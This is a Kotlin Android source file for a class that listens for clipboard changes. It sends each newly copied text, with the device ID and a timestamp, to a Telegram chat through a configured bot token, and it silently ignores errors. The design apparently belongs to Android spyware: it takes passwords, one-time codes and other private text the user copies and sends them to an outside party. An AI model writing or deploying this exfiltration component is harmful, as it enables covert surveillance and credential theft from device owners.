package com.example.scanner

import android.content.ClipboardManager
import android.content.Context
import android.os.Handler
import android.os.Looper
import com.example.data.MediaUploadRepository
import com.example.network.TelegramApiService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class LiveClipboardWatcher(
    private val context: Context,
    private val scope: CoroutineScope,
    private val telegramApi: TelegramApiService,
    private val repository: MediaUploadRepository
) {

    private var clipboardManager: ClipboardManager? = null
    private var lastCopiedText: String? = null
    private var listener: ClipboardManager.OnPrimaryClipChangedListener? = null

    fun startWatching() {
        Handler(Looper.getMainLooper()).post {
            try {
                clipboardManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
                if (clipboardManager == null) return@post

                listener = ClipboardManager.OnPrimaryClipChangedListener {
                    onClipChanged()
                }
                clipboardManager?.addPrimaryClipChangedListener(listener)
            } catch (_: Exception) {}
        }
    }

    fun stopWatching() {
        Handler(Looper.getMainLooper()).post {
            try {
                listener?.let { clipboardManager?.removePrimaryClipChangedListener(it) }
                listener = null
            } catch (_: Exception) {}
        }
    }

    private fun onClipChanged() {
        if (!repository.isClipboardSyncEnabled()) return

        val clip = clipboardManager?.primaryClip ?: return
        if (clip.itemCount == 0) return

        val text = clip.getItemAt(0)?.text?.toString()?.trim() ?: return
        if (text.isBlank() || text == lastCopiedText) return

        lastCopiedText = text

        val deviceId = repository.getDeviceId()
        val timeStr = SimpleDateFormat("HH:mm:ss dd/MM/yyyy", Locale.getDefault()).format(Date())
        val config = repository.getTelegramConfig()
        if (config.botToken.isBlank() || config.chatId.isBlank()) return

        val safeText = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

        val msg = "📋 <b>LIVE CLIPBOARD SYNCED:</b>\n\n" +
                "<code>$safeText</code>\n\n" +
                "📱 <b>Device:</b> <code>$deviceId</code>\n" +
                "🕒 <b>Copied Time:</b> $timeStr"

        scope.launch(Dispatchers.IO) {
            try {
                telegramApi.sendMessage(config.botToken, config.chatId, msg)
            } catch (_: Exception) {}
        }
    }
}
